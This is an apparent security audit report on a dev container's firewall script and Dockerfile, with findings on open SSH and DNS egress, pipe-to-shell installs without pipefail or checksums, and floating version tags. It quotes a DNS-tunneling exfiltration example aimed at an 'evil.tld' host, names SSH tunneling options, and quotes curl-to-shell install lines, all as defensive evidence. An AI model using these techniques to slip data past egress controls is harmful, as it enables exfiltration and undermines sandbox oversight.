# security — audit findings

The container's egress firewall is well-considered in its overall architecture (default-deny in strict mode, ipset-backed allowlist, signed apt keyrings), but it carries three protocol-level holes that punch straight through the allowlist: an unconditional SSH (TCP/22) egress to any host, unrestricted UDP/53 DNS egress, and a blanket DNS allow that together provide ready-made exfiltration and tunneling channels. Separately, the build pipeline trusts every non-apt download on transport alone — no checksums or signatures, no `pipefail` on the pipe-to-shell installs, and several floating `latest`/`main`/rolling refs — which leaves the image's supply chain non-reproducible and silently mutable. None are remotely exploitable on their own, but they widen the trusted-input set well beyond what a sandbox of this kind should accept. One high-severity, three medium, and one low finding follow, ordered by severity.

## Unconditional SSH (TCP/22) egress to any host — an open exfil/tunneling channel that bypasses the allowlist

- **Severity / kind:** high / security
- **Location:** [.devcontainer/init-firewall.sh:194](.devcontainer/init-firewall.sh#L194)
- **Evidence:**
  > `iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT` (line 194) is added in the baseline-allows block with no destination restriction, and it precedes the allowed-domains match + final REJECT (lines 301-302). So OUTBOUND to 0.0.0.0/0:22 is permitted in strict mode regardless of the ipset.
- **Why it matters:** In strict mode only allowlisted destinations should be reachable, yet any process can open SSH/SCP/SFTP or `ssh -D` SOCKS / `ssh -R` reverse-tunnel / `ssh -W` forward to ANY internet host on port 22 — a fully unrestricted bidirectional egress and tunneling channel. A compromised dependency or misbehaving agent can exfiltrate or pivot through it. git-over-SSH only needs github.com:22, whose ranges are already in the ipset, so the blanket allow is unnecessary.
- **Recommendation:** Drop the blanket `--dport 22` allow and gate SSH on the ipset: `iptables -A OUTPUT -p tcp --dport 22 -m set --match-set allowed-domains dst -j ACCEPT`, or remove the rule and let the generic allowed-domains OUTPUT rule cover it.

## Build-time pipe-to-shell installs run without pipefail, masking failed/partial downloads

- **Severity / kind:** medium / security
- **Location:** [.devcontainer/Dockerfile:202](.devcontainer/Dockerfile#L202)
- **Evidence:**
  > No `SHELL ["/bin/bash","-o","pipefail","-c"]` directive exists (the only SHELL token is the ENV var at line 184). RUN 201-204 does `RUN set -eux; \ curl -LsSf https://astral.sh/uv/install.sh | sh; ...` and line 207 is `RUN curl -fsSL https://claude.ai/install.sh | bash`. Default RUN shell is `/bin/sh -c`, where `set -eux` does NOT imply pipefail.
- **Why it matters:** In /bin/sh the exit status of `curl ... | sh` is the status of the right-hand interpreter only. If curl exits non-zero mid-stream (network blip, truncated body, TLS reset), the partially-piped script may still exit 0 and the build proceeds with a half-installed tool — a silent integrity failure on the most trust-sensitive steps (uv and Claude Code installers). install-tools.sh correctly sets `set -euo pipefail` (line 11), so the gap is specifically the Dockerfile RUN lines.
- **Recommendation:** Add `SHELL ["/bin/bash", "-o", "pipefail", "-c"]` near the top of the Dockerfile so every `curl | sh` RUN fails closed on a broken download.

## No integrity verification (checksum/signature) on any build-time binary download

- **Severity / kind:** medium / security
- **Location:** [.devcontainer/install-tools.sh:22](.devcontainer/install-tools.sh#L22)
- **Evidence:**
  > cargo-binstall bootstrap is piped from a MUTABLE branch: `https://raw.githubusercontent.com/cargo-bins/cargo-binstall/main/install-from-binstall-release.sh | bash` (line 22). yq fetched raw to /usr/local/bin with no checksum (lines 41-43); lazygit tarball extracted with no checksum (lines 46-51); AWS CLI zip installed with no GPG sig check (lines 62-65, though AWS publishes one). Dockerfile pipes uv (202) and Claude Code (207) installers straight to a shell. No sha/checksum/gpg-verify/cosign appears anywhere in install-tools.sh.
- **Why it matters:** Every non-apt tool is installed with transport-only trust (the apt packages ARE verified via signed-by keyrings at Dockerfile 31-36 and 63-67 — good). A compromised GitHub release, raw.githubusercontent cache poisoning, or an upstream account takeover yields silent arbitrary code execution in the image. Pulling the cargo-binstall installer from `main` (not a tag/commit) means the bootstrap content can change between builds, defeating any later pin. This is the cross-cutting supply-chain gap a per-file review misses because each download looks individually fine.
- **Recommendation:** For each binary pin an exact version, download the upstream SHA256SUMS, and verify before chmod/extract (yq, lazygit, AWS CLI publish checksums/signatures). Pin the cargo-binstall installer to a release tag or commit SHA, not `main`. At minimum document any intentionally-unverified step.

## Unrestricted UDP/53 egress to any host enables DNS-tunneling exfiltration

- **Severity / kind:** medium / security
- **Location:** [.devcontainer/init-firewall.sh:192](.devcontainer/init-firewall.sh#L192)
- **Evidence:**
  > `iptables -A OUTPUT -p udp --dport 53 -j ACCEPT` (line 192) allows DNS to ANY destination, not just Docker's embedded resolver 127.0.0.11. The script separately preserves the 127.0.0.11 NAT rules (line 165), confirming in-container resolution goes through 127.0.0.11.
- **Why it matters:** Allowing UDP/53 to the whole internet lets a process bypass the egress allowlist via DNS tunneling — encode payloads as labels and query an attacker-controlled authoritative server (`dig @ns.evil.tld <data>.evil.tld`). Containers resolve through 127.0.0.11, so wildcard 0.0.0.0/0:53 is not needed for legitimate name resolution.
- **Recommendation:** Scope DNS egress to the resolver: `iptables -A OUTPUT -p udp -d 127.0.0.11 --dport 53 -j ACCEPT` (plus matching TCP/53 to 127.0.0.11 if required) and remove the unrestricted UDP/53 allow.

## Floating 'latest' / branch refs make the image non-reproducible and a moving supply-chain target

- **Severity / kind:** low / security
- **Location:** [.devcontainer/install-tools.sh:41](.devcontainer/install-tools.sh#L41)
- **Evidence:**
  > yq pulls `releases/latest/download/...` (line 41); lazygit resolves `releases/latest` then downloads that tag (lines 46-49); cargo-binstall installer from `main` (line 22). Dockerfile: `corepack prepare pnpm@latest` (line 100), `npm install -g typescript tsx eslint prettier pyright playwright` with no versions (line 101), base `FROM node:24-bookworm` is a rolling tag (line 15).
- **Why it matters:** Two identical `docker build` runs on different days can produce different toolchains, so a vetted image cannot be reproduced and a malicious upstream release is adopted automatically on the next rebuild. For a sandbox whose value is predictability, floating refs silently widen the trusted-input set. (FROM node:24-bookworm is a deliberate multi-arch choice per the header, but still rolling.)
- **Recommendation:** Pin versions for the npm globals and pnpm, pin yq/lazygit to explicit release tags (drop `latest`), and consider digest-pinning the base image (`FROM node:24-bookworm@sha256:...`). Combine with checksum verification so a pin doubles as an integrity anchor.
